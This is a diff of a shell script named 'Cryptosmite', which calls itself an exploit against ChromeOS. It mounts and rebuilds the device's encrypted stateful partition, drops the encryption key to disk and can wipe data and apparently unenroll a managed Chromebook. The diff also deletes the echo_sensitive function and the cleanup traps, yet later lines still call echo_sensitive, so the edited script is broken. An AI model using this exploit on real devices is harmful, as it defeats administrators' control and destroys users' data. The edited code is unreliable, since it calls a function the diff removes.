@@ -123,6 +123,7 @@ CRYPTSETUP_PATH=/usr/local/bin/cryptsetup_$(arch)
 mount -o rw /dev/sda1 /mnt/stateful_partition
 chmod +x /usr/local/bin/cryptsetup_aarch64
 chmod +x /usr/local/bin/cryptsetup_x86_64
+
 SCRIPT_DATE="[2024-03-19]"
 BACKUP_PAYLOAD=/mnt/stateful_partition/stateful.tar.xz
 clear
@@ -134,19 +135,9 @@ then
 fi
 NEW_ENCSTATEFUL_SIZE=$((1024 * 1024 * 1024)) # 1 GB
 
-[ -z "$SENSITIVE_MODE" ] && SENSITIVE_MODE=0
-
 fail() {
 	printf "%b\n" "$*" >&2
 	exit 1
-}
-
-echo_sensitive() {
-	if [ "$SENSITIVE_MODE" -eq 1 ]; then
-		echo "Doing something"
-	else
-		echo "$@"
-	fi
 }
 
 get_largest_cros_blockdev() {
@@ -202,14 +193,11 @@ CROS_DEV="$(get_largest_cros_blockdev)"
 TARGET_PART="$(format_part_number "$CROS_DEV" 1)"
 [ -b "$TARGET_PART" ] || fail "$TARGET_PART is not a block device!"
 
-trap 'echo $BASH_COMMAND failed with exit code $?.' ERR
-trap 'cleanup; exit' EXIT
-trap 'echo Abort.; cleanup; exit' INT
-
 clear
 echo "Welcome to Cryptosmite."
 echo "Script date: ${SCRIPT_DATE}"
 echo ""
+
 echo "This will ${ACTION1} all data on ${TARGET_PART} and ${ACTION2} the device."
 echo "Note that this exploit is patched on some release of ChromeOS r120 and LTS r114."
 echo "Continue? (y/N)"
@@ -218,6 +206,7 @@ case "$action" in
 	[yY]) : ;;
 	*) fail "Abort." ;;
 esac
+
 
 if [ ${UNENROLL} -gt 0 ]
 then
@@ -229,6 +218,7 @@ fi
 STATEFUL_MNT=$(mktemp -d)
 mkdir -p "$STATEFUL_MNT"
 mount "$TARGET_PART" "$STATEFUL_MNT"
+
 
 echo_sensitive "Setting up encstateful"
 truncate -s "$NEW_ENCSTATEFUL_SIZE" "$STATEFUL_MNT"/encrypted.block # this keeps data, so we can actually read the old data
@@ -248,6 +238,7 @@ ENCSTATEFUL_MNT=$(mktemp -d)
 mkdir -p "$ENCSTATEFUL_MNT"
 mount /dev/mapper/encstateful "$ENCSTATEFUL_MNT"
 
+
 if [ $UNENROLL -eq 0 ]
 then
 	echo "Backing up data!"
@@ -258,6 +249,7 @@ fi
 echo_sensitive "Dropping encstateful key"
 key_crosencstateful > "$STATEFUL_MNT"/encrypted.needs-finalization
 echo $ENCSTATEFUL_KEY > /mnt/stateful_partition/enc.key
+
 
 if [ $UNENROLL -eq 0 ]
 then
